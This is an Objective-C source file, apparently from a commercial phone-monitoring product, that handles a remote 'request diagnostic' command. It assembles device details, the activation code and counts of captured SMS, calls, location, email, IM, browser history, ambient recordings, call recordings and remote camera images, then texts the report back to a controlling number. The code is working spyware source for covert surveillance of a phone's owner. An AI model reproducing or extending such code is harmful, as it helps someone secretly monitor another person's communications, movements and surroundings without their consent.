/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestDiagnosticProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  24/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestDiagnosticProcessor.h"
#import "EventRepository.h"
#import "ConnectionHistoryManager.h"
#import "ConnectionLog.h"
#import "ConfigurationManager.h"
#import "AppContext.h"
#import "PhoneInfo.h"
#import "DetailedCount.h"
#import "EventCount.h"
#import "DbHealthInfo.h"
#import "ProductInfo.h"
#import "SystemUtilsImpl.h"
#import "PreferenceManager.h"
#import "PrefEventsCapture.h"
#import "PrefRestriction.h"
#import <UIKit/UIKit.h>

@interface RequestDiagnosticProcessor (PrivateAPI)
- (void) sendReplySMSWithResult:(NSString *) aResult; 
- (void) processRequestDiagnostic;
@end

@implementation RequestDiagnosticProcessor

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the RequestDiagnosticProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
*/

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"RequestDiagnosticProcessor-->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
		
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the RequestDiagnosticProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
*/

- (void) doProcessingCommand {
	DLog (@"RequestDiagnosticProcessor--->doProcessingCommand....")
	[self processRequestDiagnostic];
}


#pragma mark RequestDiagnosticProcessor Private Methods

/**
 - Method name: processRequestDiagnostic
 - Purpose:This method is used to process RequestDiagnostic 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) processRequestDiagnostic {
	DLog (@"RequestDiagnosticProcessor--->processRequestDiagnostic")
	//=======Diagnostic Result Format===========
	
	// -- Application info
	NSString *pidString					= @"1.1>";
	NSString *versionString				= @"1.2>";	
	NSString *osVersionString			= @"1.3>";			
	NSString *deviceModelString			= @"1.4>";
	NSString *phoneName					= @"1.5>";
	NSString *activationCode			= @"1.6>";
	
	// -- Event Capture	
	NSString *smsEventString			= @"2.1>";
	NSString *mmsEventsString			= @"2.2>";	
	NSString *voiceEventString			= @"2.3>";	
	NSString *locationEventString		= @"2.4>";
	NSString *emailEventString			= @"2.5>";
	NSString *imEventString				= @"2.6>";
	NSString *browserURLEventString		= @"2.8>";		
	NSString *alcEventString			= @"2.9>";
	NSString *systemEventString			= @"2.10>";
	NSString *settingEventString		= @"2.11>";	
	NSString *panicEventString			= @"2.12>";
	NSString *thumbnailsString			= @"2.13>";
	NSString *ambientRecordString		= @"2.14>";
	NSString *audioCallRecordString		= @"2.15>";
	NSString *remoteCameraString		= @"2.16>";
	
	// -- Connection Info
    NSString *lastConnTimeString		= @"3.1>";
	NSString *serverCodeString			= @"3.2>";
	NSString *clientCodeString			= @"3.3>";
	
	// -- Network info
	NSString *tupleString				= @"4.1>";
	NSString *networkNameString			= @"4.2>";
//	NSString *availNetworkConnectionString	= @"4.3>N/A";	/// !!!:TODO
//	NSString *callWaitingString			= @"4.4>N/A";		/// !!!:TODO
//	NSString *callForwardingString		= @"4.5>N/A";		/// !!!:TODO	

	// -- Phone Info
	NSString *installDriveString		= @"5.1>/";
	NSString *gpsString					= @"5.4>AGPS, WiFi";
//	NSString *internalMemUsageString	= @"5.2>N/A";		/// !!!:TODO
	NSString *batteryLevelString		= @"5.6>";
					
	//===============================================
	id <EventRepository> respository = [[RemoteCmdUtils sharedRemoteCmdUtils] mEventRepository];
	id <ConnectionHistoryManager> connectionManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConnectionHistoryManager];
	id <ConfigurationManager> configurationManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mConfigurationManager];
	id <AppContext> context = [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
	id <PhoneInfo> phoneInfo = [context getPhoneInfo];
	id <ProductInfo> productInfo = [context getProductInfo];
	//id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	//DbHealthInfo *dbHealthInfo = [respository dbHealthInfo];
	NSArray *allConnectionHistory = [connectionManager selectAllConnectionHistory];
	ConnectionLog *lastConnectionLog = [allConnectionHistory lastObject];
	NSString *lastConnectionTime = [lastConnectionLog mDateTime];
	DetailedCount *detailedCount = nil;
	EventCount *eventCount=[respository eventCount];
	
	// -- PART 1: Application Info ---------------------------------------------------------------
	// 1.1 Pid 
	pidString		= [pidString stringByAppendingString:[NSString stringWithFormat:@"%d",[productInfo getProductID]]];
	// 1.2 version
	versionString	= [versionString stringByAppendingString:[productInfo getProductFullVersion]];	
	//pidVersionString =[pidVersionString stringByAppendingString:[NSString stringWithFormat:@"%d,%@ Date:%@",[productInfo getProductID],[productInfo getProductFullVersion],[productInfo getBuildDate]]];
	// 1.3 OS Version
	osVersionString = [osVersionString stringByAppendingString:[SystemUtilsImpl deviceIOSVersion]];
	// 1.4 DeviceModel
	//	deviceModelString = [deviceModelString stringByAppendingString:[NSString stringWithFormat:@"%@ %@",
	//																   //[phoneInfo getDeviceModel], 
	//																	[SystemUtilsImpl deviceModelVersion],
	//																	[SystemUtilsImpl deviceIOSVersion]]];
	deviceModelString = [deviceModelString stringByAppendingString:[SystemUtilsImpl deviceModelVersion]];
	
	// 1.5 PhoneName
	phoneName		= [phoneName stringByAppendingString:[[UIDevice currentDevice] name]];

	// 1.6 ActivationCode
	activationCode = [activationCode stringByAppendingString:[[[RemoteCmdUtils sharedRemoteCmdUtils] mLicenseManager] getActivationCode]];
	

	// -- PART 2: Event Capture ---------------------------------------------------------------
	
	// 2.1 SMS
	if ([configurationManager isSupportedFeature:kFeatureID_EventSMS]) {
		detailedCount = [eventCount countEvent:kEventTypeSms];
		smsEventString = [smsEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
		DLog(@"---->SMS done<----")
	} else {
		smsEventString = @"";
	}

	
	// 2.2 MMS
	if ([configurationManager isSupportedFeature:kFeatureID_EventMMS]) {
		detailedCount = [eventCount countEvent:kEventTypeMms];
		mmsEventsString=[mmsEventsString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
		DLog(@"---->MMS done<----")
	} else {
		mmsEventsString = @"";
	}

		
	// 2.3 Call
	if ([configurationManager isSupportedFeature:kFeatureID_EventCall]) {
		detailedCount = [eventCount countEvent:kEventTypeCallLog];
		voiceEventString=[voiceEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d,%d",[detailedCount inCount], [detailedCount outCount], [detailedCount missedCount]]];
		DLog(@"---->Call done<----")
	} else {
		voiceEventString = @"";
	}

	
	// 2.4 Location
	if ([configurationManager isSupportedFeature:kFeatureID_EventLocation]) {
		detailedCount = [eventCount countEvent:kEventTypeLocation];
		locationEventString =[locationEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
		DLog(@"---->Location done<----")
	} else {
		locationEventString = @"";
	}

	
	// 2.5 Email
	if ([configurationManager isSupportedFeature:kFeatureID_EventEmail]) {
		detailedCount = [eventCount countEvent:kEventTypeMail];
		emailEventString=[emailEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
		DLog(@"---->Email done<----")
	} else {
		emailEventString = @"";
	}

	
	// 2.6 IM
	if ([configurationManager isSupportedFeature:kFeatureID_EventIM]) {
		detailedCount = [eventCount countEvent:kEventTypeIM];
		imEventString = [imEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",[detailedCount inCount], [detailedCount outCount]]];
		DLog(@"---->IM done<----")
	} else {
		imEventString = @"";
	}

	
	// 2.7	pin (we does not support)
			
	// 2.8	Browser url count 
	if ([configurationManager isSupportedFeature:kFeatureID_EventBrowserUrl]) {
		detailedCount = [eventCount countEvent:kEventTypeBrowserURL];
		browserURLEventString = [browserURLEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
		DLog(@"---->Browser URL done<----")
	} else {
		browserURLEventString = @"";
	}

		
	// 2.9	Application life cycle
	if ([configurationManager isSupportedFeature:kFeatureID_ApplicationLifeCycleCapture]) {
		detailedCount = [eventCount countEvent:kEventTypeApplicationLifeCycle];
		alcEventString = [alcEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
	} else {
		alcEventString = @"";
	}

		
	// 2.10	System
	if ([configurationManager isSupportedFeature:kFeatureID_EventSystem]) {
		detailedCount = [eventCount countEvent:kEventTypeSystem];
		systemEventString=[systemEventString stringByAppendingString:[NSString stringWithFormat:@"%d", [detailedCount totalCount]]];
		DLog(@"---->System done<----")
	} else {
		systemEventString = @"";
	}

			
	// 2.11 Setting Event count  
	detailedCount = [eventCount countEvent:kEventTypeSettings];
	settingEventString = [settingEventString stringByAppendingString:[NSString stringWithFormat:@"%d",[detailedCount totalCount]]];
	DLog(@"---->Setting done<----")
	
	// 2.12	Panic status, panic image
	if ([configurationManager isSupportedFeature:kFeatureID_Panic]) {
		detailedCount = [eventCount countEvent:kEventTypePanic];
		NSInteger panicStatus = [detailedCount totalCount];
		detailedCount = [eventCount countEvent:kEventTypePanicImage];
		NSInteger panicImage = [detailedCount totalCount];
		panicEventString = [panicEventString stringByAppendingString:[NSString stringWithFormat:@"%d,%d",panicStatus, panicImage]];
	} else {
		panicEventString = @"";
	}

	
	// 2.13	Thumbnail
	if ([configurationManager isSupportedFeature:kFeatureID_EventCameraImage] ||
		[configurationManager isSupportedFeature:kFeatureID_EventWallpaper] ||
		[configurationManager isSupportedFeature:kFeatureID_EventSoundRecording] ||
		[configurationManager isSupportedFeature:kFeatureID_EventVideoRecording] ||
		[configurationManager isSupportedFeature:kFeatureID_SearchMediaFilesInFileSystem]) {
		
		detailedCount = [eventCount countEvent:kEventTypeCameraImage];
		NSInteger image = [detailedCount totalCount]; // Image Count
		
		detailedCount = [eventCount countEvent:kEventTypeAudio];
		NSInteger audio = [detailedCount totalCount]; // Audio Count
		
		detailedCount = [eventCount countEvent:kEventTypeVideo];
		NSInteger video = [detailedCount totalCount]; // Video Count
		
		detailedCount = [eventCount countEvent:kEventTypeWallpaper];
		NSInteger wp = [detailedCount totalCount]; //Wallpaer Count
		
		thumbnailsString=[thumbnailsString stringByAppendingString:[NSString stringWithFormat:@"%d,%d,%d,%d", image, audio, video, wp]];
		DLog(@"---->Thumbnail done<----")		
	} else {
		thumbnailsString = @"";
	}

		
	// 2.14	ambient record
	if ([configurationManager isSupportedFeature:kFeatureID_AmbientRecording]) {		
		detailedCount = [eventCount countEvent:kEventTypeAmbientRecordAudio];
		NSInteger ambientRecordCount = [detailedCount totalCount];
		ambientRecordString = [ambientRecordString stringByAppendingString:[NSString stringWithFormat:@"%d", ambientRecordCount]];
		DLog(@"---->ambient done<----")
	} else {
		ambientRecordString = @"";
	}

	
	// 2.15 audio call recording	
	if ([configurationManager isSupportedFeature:kFeatureID_CallRecording]) {		
		detailedCount = [eventCount countEvent:kEventTypeCallRecordAudio];
		NSInteger callRecordCount = [detailedCount totalCount];
		audioCallRecordString = [audioCallRecordString stringByAppendingString:[NSString stringWithFormat:@"%d", callRecordCount]];
		DLog(@"---->call recording done<----")
	} else {
		audioCallRecordString = @"";
	}

	
	// 2.16 remote camera
	if ([configurationManager isSupportedFeature:kFeatureID_RemoteCameraImage]) {		
		detailedCount = [eventCount countEvent:kEventTypeRemoteCameraImage];
		NSInteger remoteCameraCount = [detailedCount totalCount];
		remoteCameraString = [remoteCameraString stringByAppendingString:[NSString stringWithFormat:@"%d", remoteCameraCount]];
		DLog(@"---->remote camera done<----")
	} else {
		remoteCameraString = @"";
	}


	DLog(@"---->last Conn Time<----")
	// -- PART 3: Event Connection Info ---------------------------------------------------------------
			
	// 3.1 Last connection time
	if (lastConnectionTime) {	// check first otherwise it will cause NSException = *** -[__NSCFConstantString stringByAppendingString:]: nil argument
		lastConnTimeString=[lastConnTimeString stringByAppendingString:lastConnectionTime]; 
		// format from 22-08-2012 to 22/08/2012
		lastConnTimeString = [lastConnTimeString stringByReplacingOccurrencesOfString:@"-" withString:@"/"];
	}
	
	// 3.2 adn 3.3 Response Code 
	if ([lastConnectionLog mErrorCode] < 0) {
		clientCodeString = [NSString stringWithFormat:@"%@%d",clientCodeString,[lastConnectionLog mErrorCode]];
		serverCodeString = [NSString stringWithFormat:@"%@%d",serverCodeString, 0];
		DLog(@"---->Response Code done<----")
	} else {
		serverCodeString = [NSString stringWithFormat:@"%@%d",serverCodeString,[lastConnectionLog mErrorCode]];
		clientCodeString = [NSString stringWithFormat:@"%@%d",clientCodeString, 0];	
		DLog(@"---->Response Code done<----")
	}
					
	// -- PART 4: Network Info ---------------------------------------------------------------
	
	// 4.1	TUPLE 
	tupleString= [NSString stringWithFormat:@"%@%@,%@", tupleString,[phoneInfo getMobileCountryCode],[phoneInfo getMobileNetworkCode]];
	DLog(@"---->tupleString<----")
	
	// 4.2	Network name
	networkNameString=[networkNameString stringByAppendingString:[phoneInfo getNetworkName]];
	DLog(@"---->networkNameString<----")
	// 4.3 Available internet connnection
	
	// 4.4 Call waiting status
	
	// 4.5 Call forwarding status
	
	
	// -- PART 5: Phone info
	
	// 5.1	initial drive
	// already done
	
	// 5.2	internal mem usage
	
	// 5.6	Battery level
 	BOOL previousBatteryMonitoringStatus = [[UIDevice currentDevice] isBatteryMonitoringEnabled];		
 	[[UIDevice currentDevice] setBatteryMonitoringEnabled:YES]; // If battery monitoring is not enabled, the value of 'batteryLevel' property is –1.0.	
	float batteryLevel = [[UIDevice currentDevice] batteryLevel];	
	DLog(@"Battery info %f", batteryLevel)	
 	[[UIDevice currentDevice] setBatteryMonitoringEnabled:previousBatteryMonitoringStatus];
	
	if (batteryLevel >= 0.0 && batteryLevel <= 1.0) {
		// 1 convert from 0.x to y percent (e.g., 0.1 --> 10 %)
		// 2 convert float to int
		NSNumber *batteryLevelNum = [NSNumber numberWithFloat:(batteryLevel * 100)];  
		batteryLevelString = [batteryLevelString stringByAppendingString:[NSString stringWithFormat:@"%d", [batteryLevelNum intValue]]];
	} else {
		DLog (@"Invalid battery level")
	}
	
	NSString *result =[NSString stringWithFormat:@"%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n%@\n",
					   pidString,								// 1.1
					   versionString,							// 1.2
					   osVersionString,							// 1.3
					   deviceModelString,			// 2		// 1.4
					   phoneName,								// 1.5
					   activationCode,							// 1.6	
					   
					   smsEventString,				// 3		// 2.1
					   mmsEventsString,				// 22		// 2.2					   
					   voiceEventString,			// 4		// 2.3
					   locationEventString,			// 5		// 2.4
					   emailEventString,			// 6		// 2.5
					   imEventString,				// 25		// 2.6
					   browserURLEventString,		// 26		// 2.8
					   alcEventString,				// 28		// 2.9
					   systemEventString,						// 2.10
					   settingEventString,			// 27		// 2.11
					   panicEventString,			// 29		// 2.12					   
					   thumbnailsString,			// 24		// 2.13					   
					   ambientRecordString,						// 2.14
					   audioCallRecordString,					// 2.15
					   remoteCameraString,						// 2.16
					   
					   lastConnTimeString,			// 7		// 3.1
					   serverCodeString,						// 3.2
					   clientCodeString,						// 3.3
					   
					   tupleString,					// 10		// 4.1
					   networkNameString,			// 11		// 4.2
					   //availNetworkConnectionString,			// 4.3
					   //callWaitingString,						// 4.4
					   //callForwardingString,					// 4.5

					   installDriveString,			// 13		// 5.1
					   gpsString,								// 5.4
					   //internalMemUsageString,					// 5.2
					   batteryLevelString];						// 5.6

	// Replacing any continously new lines with one new line till no longer contiunous new lines
	while (1) {
		NSRange locationOfnn = [result rangeOfString:@"\n\n"];
		if (locationOfnn.location != NSNotFound) {
			result = [result stringByReplacingOccurrencesOfString:@"\n\n"
													   withString:@"\n"];
		} else {
			break;
		}
	}
	
	// ============
	// 9 APN
	// already done		
	// 12 Database size
	//	dbSizeString=[dbSizeString stringByAppendingString:[NSString stringWithFormat:@"%llu", ([dbHealthInfo mDatabaseSize])/1024]];
	//	// 14 Available size 
	//	availableMemoryString = [availableMemoryString stringByAppendingString:[NSString stringWithFormat:@"%lluKB", ([dbHealthInfo mAvailableSize])/1024]];
	//	
	//	// 15  Database Corrupt count
	//	NSInteger writeErrorCount = 0;
	//	NSInteger readErrorCount = 0;
	//	NSArray *tableLogArray = [dbHealthInfo tableLogArray];
	//	for (NSValue *tableHealthLogValue in tableLogArray){
	//		TableHealthLog tableHealthLog;
	//		[tableHealthLogValue getValue:&tableHealthLog];
	//		DLog(@"tableHelthLog %@", tableLogArray)
	//		DLog(@"tableHealthLog write error: %d", tableHealthLog.writeErrorCount)
	//		DLog(@"tableHealthLog read error: %d", tableHealthLog.readErrorCount)
	//		writeErrorCount = writeErrorCount + tableHealthLog.writeErrorCount;
	//		readErrorCount = readErrorCount + tableHealthLog.readErrorCount;
	//	}
	//	DLog(@"write error count: %d", writeErrorCount)
	//	DLog(@"read error count: %d", readErrorCount)
	//	dbCorruptCountString = [dbCorruptCountString stringByAppendingString:[NSString stringWithFormat:@"%d", writeErrorCount]];
	//	
	//	// 16 Database Damage count
	//	dbDamageString = [dbDamageString stringByAppendingString:[NSString stringWithFormat:@"%d", readErrorCount]];
	//	
	//	// 17 Database drop count 
	//	dbDroppedCountString=[dbDroppedCountString stringByAppendingString:[NSString stringWithFormat:@"%d", [dbHealthInfo dbDropCount]]];
	//
	//	// 18 DB row corrupt
	//	// already done
	//	
	//	// 19 recovered count
	//	dbRecoveredCountString = [dbRecoveredCountString stringByAppendingString:[NSString stringWithFormat:@"%d", [dbHealthInfo dbRecoveryCount]]];
	//	
	//	// 20 Phone's GPS Setting
	//	// already done
	//	
	//	// 21 isLowMemory 
	//	if (([dbHealthInfo mAvailableSize])/1024 <= 500) 
	//		isMemoryLowString=[isMemoryLowString stringByAppendingString:@"1"];
	//	else  
	//		isMemoryLowString=[isMemoryLowString stringByAppendingString:@"0"];	
	//	// 23 Address book
	//	if ([configurationManager isSupportedFeature:kFeatureID_AddressbookManagement]) {
	//    	PrefRestriction *prefRestriction = (PrefRestriction *)[prefManager preference:kRestriction];
	//		if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeOff) {
	//			addresBookString=[addresBookString stringByAppendingString:[NSString stringWithFormat:@"%d", 0]];
	//		} else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeMonitor) {
	//			addresBookString=[addresBookString stringByAppendingString:[NSString stringWithFormat:@"%d", 1]];
	//		} else if ([prefRestriction mAddressBookMgtMode] & kAddressMgtModeRestrict) {
	//			addresBookString=[addresBookString stringByAppendingString:[NSString stringWithFormat:@"%d", 2]];
	//		}
	//	}
	//	 					 															 
					
	DLog(@"diagnostic result %@", result)
	[self sendReplySMSWithResult:result];
	
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
*/

- (void) sendReplySMSWithResult: (NSString *) aResult {
	DLog (@"RequestDiagnosticProcessor--->sendReplySMS")
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
															    					  andErrorCode:_SUCCESS_];
	NSString *requestDiagnosticMessage = [NSString stringWithFormat:@"%@%@",messageFormat,aResult];

	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
												 andReplyMessage:requestDiagnosticMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
														       andMessage:requestDiagnosticMessage];
	}
}

/*
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

-(void) dealloc {
	[super dealloc];
}


@end
